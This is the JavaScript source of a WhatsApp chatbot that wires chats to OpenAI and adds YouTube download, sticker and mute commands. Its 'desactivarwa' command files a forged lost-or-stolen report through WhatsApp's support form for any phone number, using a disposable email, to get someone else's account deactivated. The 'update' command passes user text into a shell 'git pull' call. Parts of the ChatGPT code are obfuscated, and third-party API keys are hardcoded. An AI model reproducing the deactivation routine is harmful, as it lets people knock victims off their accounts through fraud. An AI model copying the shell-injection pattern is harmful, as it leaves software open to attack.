"use strict";
process.on('uncaughtException', console.error)
const { downloadContentFromMessage, downloadMediaMessage } = require("@adiwajshing/baileys");
const { color, bgcolor } = require("../lib/color");
const fetch = require("node-fetch");
const fs = require("fs");
const moment = require("moment-timezone");
const util = require("util");
const { exec, spawn, execSync } = require("child_process");
let setting;
const { ownerNumber, MAX_TOKEN, OPENAI_KEY } = setting = require('../config.json');
const speed = require("performance-now");
const ffmpeg = require("fluent-ffmpeg");
let { ytmp4, ytmp3, ytplay, ytplayvid } = require('../lib/youtube')
const { mediafireDl, getGroupAdmins } = require('../lib/myfunc')
const axios = require("axios");
const cheerio = require("cheerio");
moment.tz.setDefault("Asia/Jakarta").locale("id");

module.exports = async (conn, msg, m, openai) => {
  try {
    //if (msg.key.fromMe) return
    const { type, isQuotedMsg, quotedMsg, mentioned, now, fromMe } = msg;
    const toJSON = (j) => JSON.stringify(j, null, "\t");
    const from = msg.key.remoteJid;
    const chats = type === "conversation" && msg.message.conversation ? msg.message.conversation : type === "imageMessage" && msg.message.imageMessage.caption ? msg.message.imageMessage.caption : type === "videoMessage" && msg.message.videoMessage.caption ? msg.message.videoMessage.caption : type === "extendedTextMessage" && msg.message.extendedTextMessage.text ? msg.message.extendedTextMessage.text : type === "buttonsResponseMessage" && quotedMsg.fromMe && msg.message.buttonsResponseMessage.selectedButtonId ? msg.message.buttonsResponseMessage.selectedButtonId : type === "templateButtonReplyMessage" && quotedMsg.fromMe && msg.message.templateButtonReplyMessage.selectedId ? msg.message.templateButtonReplyMessage.selectedId : type === "messageContextInfo" ? msg.message.buttonsResponseMessage?.selectedButtonId || msg.message.listResponseMessage?.singleSelectReply.selectedRowId : type == "listResponseMessage" && quotedMsg.fromMe && msg.message.listResponseMessage.singleSelectReply.selectedRowId ? msg.message.listResponseMessage.singleSelectReply.selectedRowId : "";
    const args = chats.split(" ");
    const args22 = chats.trim().split(/ +/).slice(1)
    const prefix = /^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#%^&./\\©^]/.test(chats) ? chats.match(/^[°•π÷×¶∆£¢€¥®™✓=|~+×_*!#,|÷?;:%^&./\\©^]/gi) : null;
    const command = prefix ? chats.slice(1).trim().split(' ').shift().toLowerCase() : ''
    const isGroup = msg.key.remoteJid.endsWith("@g.us");
    const groupMetadata = msg.isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
    const groupName = msg.isGroup ? groupMetadata.subject : ''  
    const sender = isGroup ? msg.key.participant ? msg.key.participant : msg.participant : msg.key.remoteJid;
    const userId = sender.split("@")[0]
    const botNumber = conn.user.id.split(":")[0] + "@s.whatsapp.net";
    const isOwner = [botNumber,...ownerNumber].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(sender)
    const pushname = msg.pushName;
    const q = chats.slice(command.length + 1, chats.length);
    const textoo = args22.join(" ")  
    const isCmd = chats.startsWith(prefix)
    const content = JSON.stringify(msg.message)
    const isImage = (type == 'imageMessage')
    const isVideo = (type == 'videoMessage')
    const isAudio = (type == 'audioMessage')
    const isSticker = (type == 'stickerMessage')
    const isDocument = (type == 'documentMessage')
    const isLocation = (type == 'locationMessage')
    const isViewOnce = (type == 'viewOnceMessageV2')
    const isQuotedImage = isQuotedMsg ? content.includes('imageMessage') ? true : false : false    
    const isQuotedVideo = isQuotedMsg ? content.includes('videoMessage') ? true : false : false
    const textolink = decodeURIComponent(chats.replace(command, '').replace(prefix, '').split(' ').join(''))  
    const textosinespacio = decodeURIComponent(chats.replace(command, '').replace(prefix, ''))
    const participants = msg.isGroup ? await groupMetadata.participants : ''
    const groupAdmins = msg.isGroup ? await getGroupAdmins(participants) : ''
    const isAdmin = msg.isGroup ? groupAdmins.includes(sender) : false
    let senderJid;
    if (msg.isGroup) {
    senderJid = msg.key.participant;
    } else {
    senderJid = msg.key.remoteJid;}

  
/* Baneo de chats */

try {    
let banned = global.db.data.chats[from].mute  
if (banned && !chats.includes('unmute')) return  
} catch {
}  
  
/* Envios de mensajes */ 
    
const reply = (teks) => {
conn.sendMessage(from, { text: teks }, { quoted: msg });
};
const tempButton = async (remoteJid, text, footer, content) => {
const templateMessage = { viewOnceMessage: { message: { templateMessage: { hydratedTemplate: { hydratedContentText: text, hydratedContentFooter: footer, hydratedButtons: content, }, }, }, }, };
const sendMsg = await conn.relayMessage(remoteJid, templateMessage, {}); 
};
const sendAud = (link) => { 
conn.sendMessage(from, { audio: { url: link }, fileName: `error.mp3`, mimetype: 'audio/mp4' }, { quoted: msg });
};
const sendVid = (link, thumbnail) => {
conn.sendMessage( from, { video: { url: link }, fileName: `error.mp4`, thumbnail: thumbnail, mimetype: 'video/mp4' }, { quoted: msg });
};      
const sendImgUrl = (link) => {
conn.sendMessage( from, { image: { url: link }, fileName: `error.jpg` }, { quoted: msg });
};         
      
/* Auto Read & Presence Online */
conn.readMessages([msg.key]);
conn.sendPresenceUpdate("available", from);

    // Logs;
    if (!isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "DE", color(pushname), ":", chats);
    }
    if (isGroup && isCmd && !fromMe) {
      console.log("->[\x1b[1;32mCMD\x1b[1;37m]", color(moment(msg.messageTimestamp * 1000).format("DD/MM/YYYY HH:mm:ss"), "yellow"), color(`${command} [${args.length}]`), "DE", color(pushname), "in", color(groupName), ":", chats);
    }

switch (command) {
case 'start': case 'menu':
//@${senderJid.split`@`[0] || pushname || 'user'}    
var textReply = `Hola 👋

Soy un Bot de WhatsApp que usa la inteligencia artificial de OpenAI (ChatGPT), fui creado para responder a tus preguntas. Envíame una pregunta y te responderé!. 

_El Bot se limita a responder ${MAX_TOKEN} palabras como máximo_

Comandos disposibles:
- ${prefix}start
- ${prefix}ping
- ${prefix}runtime
- ${prefix}play
- ${prefix}play2
- ${prefix}ytmp3
- ${prefix}ytmp4
- ${prefix}chatgpt
- ${prefix}chatgpt2
- ${prefix}delchatgpt
- ${prefix}dall-e
- ${prefix}sticker
- ${prefix}mediafiredl
- ${prefix}mute
- ${prefix}unmute

Comandos del Owner:
- ${prefix}update
- ${prefix}desactivarwa

*Editado By @5219996125657*`
let fkontak2 = { "key": { "participants":"0@s.whatsapp.net", "remoteJid": "status@broadcast", "fromMe": false, "id": "Halo" }, "message": { "contactMessage": { "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:y\nitem1.TEL;waid=${senderJid.split('@')[0]}:${senderJid.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD` }}, "participant": "0@s.whatsapp.net" }  
conn.sendMessage(from, { text: textReply, mentions: [...textReply.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}, { quoted: fkontak2 });
conn.sendMessage(from, { text: textReply, mentions: [...textReply.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')}, { quoted: msg });
break
case 'runtime':    
reply(require('../lib/myfunc').runtime(process.uptime()))
break
case 'ping':
var timestamp = speed();
var latensi = speed() - timestamp
reply(`*Tiempo de respuesta: ${latensi.toFixed(4)}s*`)
break     
case 'play':
if (!args[1]) return reply(`*[❗] Nombre de la canción faltante, por favor ingrese el comando mas el nombre, titulo o enlace de alguna canción o video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command} Good Feeling - Flo Rida*`)        
let res = await fetch(`https://api.lolhuman.xyz/api/ytplay2?apikey=BrunoSobrino&query=${textosinespacio}`) 
let json = await res.json()
let kingcore = await ytplay(textosinespacio)
let audiodownload = json.result.audio
if (!audiodownload) audiodownload = kingcore.result
sendAud(`${audiodownload}`)
break
case 'mute': case 'banchat':    
if (isGroup && !isAdmin) return reply(`*[❗] Este comando solo puede ser usado por admins del grupo*`)    
if (global.db.data.chats[from].mute) return reply(`*[❗] Este chat ya estaba muteado (baneado) desde antes*`)
global.db.data.chats[from].mute = true
reply(`*[❗] Este chat se ha muteado (baneado) correctamente, el Bot no responderá a ningun mensaje hasta ser desbaneado con el comando ${prefix}unmute*`)
break           
case 'unmute': case 'unbanchat':
if (isGroup && !isAdmin) return reply(`*[❗] Este comando solo puede ser usado por admins del grupo*`)    
if (!global.db.data.chats[from].mute) return reply(`*[❗] Este chat no esta muteado (baneado)*`)
global.db.data.chats[from].mute = false
reply(`*[❗] Este chat ha sido desmuteado (desbaneado) correctamente, ahora el Bot responderá con normalidad*`)
break          
case 'play2':
if (!args[1]) return reply(`*[❗] Nombre de la canción faltante, por favor ingrese el comando mas el nombre, titulo o enlace de alguna canción o video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command} Good Feeling - Flo Rida*`)        
let mediaa = await ytplayvid(textosinespacio)
sendVid(mediaa.result, `${mediaa.thumb}`)
break   
case 'ytmp3':
if (!args[1]) return reply(`*[❗] Ingresa el enlace de un video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress22 = await fetch(`https://api.lolhuman.xyz/api/ytaudio2?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn22 = await ress22.json()
let kingcoreee2 = await ytmp3(textolink)
let audiodownloaddd2 = jsonn22.result.link
if (!audiodownloaddd2) audiodownloaddd2 = kingcoreee2.result
sendAud(`${audiodownloaddd2}`)    
break        
case 'ytmp4':
if (!args[1]) return reply(`*[❗] Ingresa el enlace de un video de YouTube*\n\n*—◉ Ejemplo:*\n*◉ ${prefix + command}* https://youtu.be/WEdvakuztPc`)    
let ress2 = await fetch(`https://api.lolhuman.xyz/api/ytvideo?apikey=BrunoSobrino&url=${textolink}`) 
let jsonn2 = await ress2.json()
let kingcoreee = await ytmp4(textolink)
let videodownloaddd = jsonn2.result.link.link
if (!videodownloaddd) videodownloaddd = kingcoreee.result
sendVid(videodownloaddd, `${kingcoreee.thumb}`)    
break    
case 'dall-e': case 'draw': 
if (!args[1]) return reply(`*[❗] Ingrese un texto el cual sera la tematica de la imagen y así usar la función de la IA Dall-E*\n\n*—◉ Ejemplos de peticions:*\n*◉ ${prefix + command} gatitos llorando*\n*◉ ${prefix + command} hatsune miku beso*`)    
try {       
const responsee = await openai.createImage({ prompt: textosinespacio, n: 1, size: "512x512", });    
sendImgUrl(responsee.data.data[0].url)        
} catch (jj) {
try {      
sendImgUrl(`https://api.lolhuman.xyz/api/dall-e?apikey=BrunoSobrino&text=${textosinespacio}`)  
} catch (jj2) {
reply("*[❗] Error, no se obtuvo ninguna imagen de la IA...*\n\n*—◉ Error:*\n" + jj2)        
}}
break 
case 'update':
if (!isOwner) return reply('*[❗] Este comando solo puede ser utilizado por el Owner del Bot*')    
try {    
let stdout = execSync('git pull' + (m.fromMe && q ? ' ' + q : ''))
await reply(stdout.toString()) 
} catch { 
let updatee = execSync('git remote set-url origin https://github.com/BrunoSobrino/openai-botwa.git && git pull')
await reply(updatee.toString())}  
break
case 'desactivarwa':      
if (!isOwner) return reply('*[❗] Este comando solo puede ser utilizado por el Owner del Bot*')    
if (!q || !args[1]) return reply(`*[❗] Ingrese un numero, ejemplo ${prefix + command} +1 (450) 999-999*`)
let ntah = await axios.get("https://www.whatsapp.com/contact/noclient/")
let email = await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=10")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let ressss = await axios({ url, method: "POST", data: form, headers: { cookie } })
var payload = String(ressss.data)
if (payload.includes(`"payload":true`)) {
reply(`##- WhatsApp Support -##\n\nHola,\n\nGracias por tu mensaje.\n\nHemos desactivado tu cuenta de WhatsApp. Esto significa que su cuenta está deshabilitada temporalmente y se eliminará automáticamente en 30 días si no vuelve a registrar la cuenta. Tenga en cuenta: el equipo de atención al cliente de WhatsApp no puede eliminar su cuenta manualmente.\n\nDurante el período de cierre:\n • Es posible que sus contactos en WhatsApp aún vean su nombre y foto de perfil.\n • Cualquier mensaje que sus contactos puedan enviar a la cuenta permanecerá en estado pendiente por hasta 30 días.\n\nSi desea recuperar su cuenta, vuelva a registrar su cuenta lo antes posible.\nVuelva a registrar su cuenta ingresando el código de 6 dígitos, el código que recibe por SMS o llamada telefónica. Si te vuelves a registrar\n\nSi tiene alguna otra pregunta o inquietud, no dude en ponerse en contacto con nosotros. Estaremos encantados de ayudar!`)
} else if (payload.includes(`"payload":false`)) {
reply(`##- WhatsApp Support -##\n\nHola:\n\nGracias por tu mensaje.\n\nPara proceder con tu solicitud, necesitamos que verifiques que este número de teléfono te pertenece. Por favor, envíanos documentación que nos permita verificar que el número es de tu propiedad, como una copia de la factura telefónica o el contrato de servicio.\n\nPor favor, asegúrate de ingresar tu número de teléfono en formato internacional completo. Para obtener más información sobre el formato internacional, consulta este artículo.\n\nSi tienes alguna otra pregunta o inquietud, no dudes en contactarnos. Estaremos encantados de ayudarte.`)
} else reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
break   
case 'mediafiredl':
let resss2 = await mediafireDl(textosinespacio)
let caption = `
*📓 Nombre:* ${resss2.name}
*📁 Peso:* ${resss2.size}
*📄 Tipo:* ${resss2.mime}\n
*⏳ Espere en lo que envio su archivo. . . .* 
`.trim()
await reply(caption)
await conn.sendMessage(from, { document : { url: resss2.link }, fileName: resss2.name, mimetype: resss2.mime.toUpperCase() }, { quoted: msg })       
break
/*-------------------------------------------------------*/
/* [❗]                      [❗]                      [❗] */  
/*                                                       */ 
/*         |- [ ⚠ ] - CODIGO OFUSCADO - [ ⚠ ] -|        */
/*     —◉ DESAROLLADO POR OTOSAKA:                       */
/*     ◉ Otosaka (https://github.com/6otosaka9)          */
/*     ◉ Número: wa.me/51993966345                       */
/*                                                       */
/*     —◉ FT:                                            */
/*     ◉ BrunoSobrino (https://github.com/BrunoSobrino)  */
/*                                                       */
/* [❗]                      [❗]                      [❗] */
/*-------------------------------------------------------*/    
case 'chatgpt': case 'ia': 
function _0x3fc1(){const _0x50bdf0=['application/json','790416mKuBqF','6481376QTGKXA','users','choices','user','Bearer\x20','294830yUeVuP','data','json','message','createCompletion','https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=','content','5iCMnld','trim','4IaIlHD','text','877371MtbBDH','Human:','https://api.openai.com/v1/chat/completions','2300788oIcZXa','push','result','1yOvYFz','gpt-3.5-turbo','31590PazfrX','2347242bADAhd','24TrLUVq','1701yWZDFE','post','system'];_0x3fc1=function(){return _0x50bdf0;};return _0x3fc1();}const _0x1c80dc=_0xfd22;(function(_0x33c7d6,_0x1952df){const _0x4ed4ca=_0xfd22,_0x1f6913=_0x33c7d6();while(!![]){try{const _0x27a7c5=parseInt(_0x4ed4ca(0xc8))/0x1*(-parseInt(_0x4ed4ca(0xb7))/0x2)+-parseInt(_0x4ed4ca(0xc2))/0x3*(parseInt(_0x4ed4ca(0xc0))/0x4)+parseInt(_0x4ed4ca(0xbe))/0x5*(-parseInt(_0x4ed4ca(0xcb))/0x6)+-parseInt(_0x4ed4ca(0xc5))/0x7+-parseInt(_0x4ed4ca(0xb1))/0x8+parseInt(_0x4ed4ca(0xcd))/0x9*(parseInt(_0x4ed4ca(0xca))/0xa)+parseInt(_0x4ed4ca(0xb2))/0xb*(parseInt(_0x4ed4ca(0xcc))/0xc);if(_0x27a7c5===_0x1952df)break;else _0x1f6913['push'](_0x1f6913['shift']());}catch(_0x3df380){_0x1f6913['push'](_0x1f6913['shift']());}}}(_0x3fc1,0x7e336));function _0xfd22(_0x56a413,_0x34d51c){const _0x3fc1c2=_0x3fc1();return _0xfd22=function(_0xfd2282,_0x317738){_0xfd2282=_0xfd2282-0xb0;let _0x2d662a=_0x3fc1c2[_0xfd2282];return _0x2d662a;},_0xfd22(_0x56a413,_0x34d51c);}try{let chgpPtdb=global['chatgpt'][_0x1c80dc(0xb8)][_0x1c80dc(0xb3)][senderJid];chgpPtdb[_0x1c80dc(0xc6)]({'role':_0x1c80dc(0xb5),'content':textosinespacio});const confFig={'method':_0x1c80dc(0xce),'url':_0x1c80dc(0xc4),'headers':{'Content-Type':_0x1c80dc(0xb0),'Authorization':_0x1c80dc(0xb6)+OPENAI_KEY},'data':JSON['stringify']({'model':_0x1c80dc(0xc9),'messages':[{'role':_0x1c80dc(0xcf),'content':''},...chgpPtdb]})};let respPonse=await axios(confFig);chgpPtdb[_0x1c80dc(0xc6)]({'role':'assistant','content':respPonse[_0x1c80dc(0xb8)][_0x1c80dc(0xb4)][0x0][_0x1c80dc(0xba)]['content']}),reply(respPonse[_0x1c80dc(0xb8)][_0x1c80dc(0xb4)][0x0][_0x1c80dc(0xba)][_0x1c80dc(0xbd)]);}catch(_0xc689ef){try{const BotTIA222=await openai[_0x1c80dc(0xbb)]({'model':'text-davinci-003','prompt':textosinespacio,'temperature':0.3,'max_tokens':MAX_TOKEN,'stop':['Ai:',_0x1c80dc(0xc3)],'top_p':0x1,'frequency_penalty':0.2,'presence_penalty':0x0});reply(BotTIA222['data']['choices'][0x0][_0x1c80dc(0xc1)][_0x1c80dc(0xbf)]());}catch(_0x563cd7){try{let RrreEs=await fetch('https://api.ibeng.tech/api/info/openai?text='+textosinespacio+'&apikey=tamvan'),JjjsoEn=await RrreEs[_0x1c80dc(0xb9)]();m['reply'](JjjsoEn[_0x1c80dc(0xb8)][_0x1c80dc(0xb8)][_0x1c80dc(0xbf)]());}catch(_0x5af3b5){try{let tiIoress22=await fetch(_0x1c80dc(0xbc)+textosinespacio+'&user=user-unique-id'),hasiIll22=await tiIoress22[_0x1c80dc(0xb9)]();reply((''+hasiIll22[_0x1c80dc(0xc7)])[_0x1c80dc(0xbf)]());}catch(_0x2f5321){console['log'](_0x2f5321);}}}}    
break 
case 'delchatgpt':
try {
delete global.chatgpt.data.users[senderJid]  
reply(`*[❗] Se elimino con exito el historial de mensajes entre usted y ChatGPT (IA)*\n\n*—◉ Recuerde que puede ultilizar este comando cuando tenga algun error en el comando ${prefix}chatgpt O ${prefix}ia*`)    
} catch (error1) {   
console.log(error1)
reply(`*[❗] Error, vuelva a intentarlo*`)   
}   
break    
case 'chatgpt2': case 'ia2':      
if (!args[1]) return reply(`*[❗] Ingrese una petición o una orden para usar la funcion ChatGPT*\n\n*—◉ Ejemplos de peticions u ordenes:*\n*◉ ${prefix + command} Reflexion sobre la serie Merlina 2022 de netflix*\n*◉ ${prefix + command} Codigo en JS para un juego de cartas*`)           
try {
const BotIA = await openai.createCompletion({ model: "text-davinci-003", prompt: textosinespacio, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(BotIA.data.choices[0].text.trim())
} catch (qe) {
try {   
let rrEes = await fetch(`https://api.ibeng.tech/api/info/openai?text=${textosinespacio}&apikey=tamvan`)
let jjJson = await rrEes.json()
reply(jjJson.data.data.trim())    
} catch (qe4) {      
try {    
let tioress = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${textosinespacio}&user=user-unique-id`)
let hasill = await tioress.json()
reply(`${hasill.result}`.trim())   
} catch (qqe) {        
reply("*[❗] Error, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + qqe)  
}}} 
break       
case 'sticker': case 's':
try {        
const pname = 'OpenAI - WaBot'
const athor = '+' + conn.user.id.split(":")[0];
if (isImage || isQuotedImage) {
await conn.downloadAndSaveMediaMessage(msg, "image", `./tmp/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./tmp/${sender.split("@")[0]}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(`./tmp/${sender.split("@")[0]}.jpeg`)
} else {
if(isVideo || isQuotedVideo) {
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./tmp/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
const imageBuffer = await downloadMediaMessage(msg, 'buffer', {}, {});
let filenameJpg = "stk.jpg";
fs.writeFileSync(filenameJpg, imageBuffer);
await ffmpeg('./' + filenameJpg).input(filenameJpg).on('start', function(cmd){
console.log(`Started: ${cmd}`)
}).on('error', function(err) {
console.log(`Error: ${err}`);
reply('error')}).on('end', async function() {
console.log('Finish')
await conn.sendMessage(from, {sticker: {url:'stk.webp'}})
}).addOutputOptions([`-vcodec`,`libwebp`,`-vf`,`scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`]).toFormat('webp').save('stk.webp');
}}} catch {     
reply(`*[❗] Responda a una imagen, gif o video, el cual será convertido en sticker, recuerde que debe mandar una imagen o responder a una imagen con el comando ${prefix + command}*`)        
}
break 
default:
const botNumber22 = '@' + conn.user.id.split(":")[0];
if (msg.key.fromMe || msg.sender == conn.user.id) return //console.log('[❗] Unicamente respondo mensajes sin comandos de otros usuarios pero no se mi mismo')    
if (!chats.startsWith(botNumber22) && isGroup) return
if (isImage || isVideo || isSticker || isViewOnce || isAudio || isDocument || isLocation) return
let chatstext = chats.replace(conn.user.id.split(":")[0].split("@")[0], '')
if (isGroup) chatstext = chatstext.replace("@", '').replace(prefix, '')
console.log("->[\x1b[1;32mNew\x1b[1;37m]", color('Pregunta De', 'yellow'), color(pushname, 'lightblue'), `: "${chatstext}"`)
conn.sendPresenceUpdate("composing", from);
try {
const _0x3f9840=_0xecfe;(function(_0x83ff45,_0x26cd33){const _0x21913f=_0xecfe,_0x53e383=_0x83ff45();while(!![]){try{const _0x25b520=parseInt(_0x21913f(0x10b))/0x1*(-parseInt(_0x21913f(0xf5))/0x2)+parseInt(_0x21913f(0xfa))/0x3*(parseInt(_0x21913f(0x101))/0x4)+-parseInt(_0x21913f(0x103))/0x5*(parseInt(_0x21913f(0xfe))/0x6)+parseInt(_0x21913f(0xf9))/0x7+-parseInt(_0x21913f(0x10d))/0x8+-parseInt(_0x21913f(0xfd))/0x9*(-parseInt(_0x21913f(0xf7))/0xa)+-parseInt(_0x21913f(0x104))/0xb;if(_0x25b520===_0x26cd33)break;else _0x53e383['push'](_0x53e383['shift']());}catch(_0xb243a9){_0x53e383['push'](_0x53e383['shift']());}}}(_0x293a,0x45059));let chgptdb=global[_0x3f9840(0xf6)]['data'][_0x3f9840(0x107)][senderJid];chgptdb['push']({'role':'user','content':textosinespacio});function _0x293a(){const _0x4dd0e5=['10lbZdjj','2392995dGDjHS','content','https://api.openai.com/v1/chat/completions','users','push','system','post','121EUnlFL','stringify','2192880zjeDcH','3676LIoQZD','chatgpt','20wxJqYf','choices','3580451oqdvfA','4299lRFlUA','application/json','message','1149651oECKrw','260694qZRQCn','data','assistant','884ZYuflz','Bearer\x20'];_0x293a=function(){return _0x4dd0e5;};return _0x293a();}const config={'method':_0x3f9840(0x10a),'url':_0x3f9840(0x106),'headers':{'Content-Type':_0x3f9840(0xfb),'Authorization':_0x3f9840(0x102)+OPENAI_KEY},'data':JSON[_0x3f9840(0x10c)]({'model':'gpt-3.5-turbo','messages':[{'role':_0x3f9840(0x109),'content':''},...chgptdb]})};let response=await axios(config);function _0xecfe(_0xdd2314,_0x53d766){const _0x293a47=_0x293a();return _0xecfe=function(_0xecfedd,_0x273a63){_0xecfedd=_0xecfedd-0xf5;let _0x1471f7=_0x293a47[_0xecfedd];return _0x1471f7;},_0xecfe(_0xdd2314,_0x53d766);}chgptdb[_0x3f9840(0x108)]({'role':_0x3f9840(0x100),'content':response[_0x3f9840(0xff)][_0x3f9840(0xf8)][0x0][_0x3f9840(0xfc)][_0x3f9840(0x105)]}),reply(response[_0x3f9840(0xff)]['choices'][0x0][_0x3f9840(0xfc)][_0x3f9840(0x105)]);  
} catch {   
try {
const response = await openai.createCompletion({ model: "text-davinci-003", prompt: chatstext, temperature: 0.3, max_tokens: MAX_TOKEN, stop: ["Ai:", "Human:"], top_p: 1, frequency_penalty: 0.2, presence_penalty: 0, })
reply(response.data.choices[0].text.trim())
} catch (eee1) {
try {
let rresSS = await fetch(`https://api.ibeng.tech/api/info/openai?text=${chatstext}&apikey=tamvan`)
let jjsonNN = await rresSS.json()
reply(jjsonNN.data.data.trim())     
} catch (eee) {  
try {    
let tiores = await fetch(`https://api.lolhuman.xyz/api/openai?apikey=BrunoSobrino&text=${chatstext}&user=user-unique-id`)
let hasil = await tiores.json()
reply(`${hasil.result}`.trim())   
} catch (eeee) {        
reply("*[❗] Error, no se obtuvieron respuestas de la IA...*\n\n*—◉ Error:*\n" + eeee)  
}}}}
break
}} catch (err) {
console.log(color("[ERROR]", "red"), err); }};
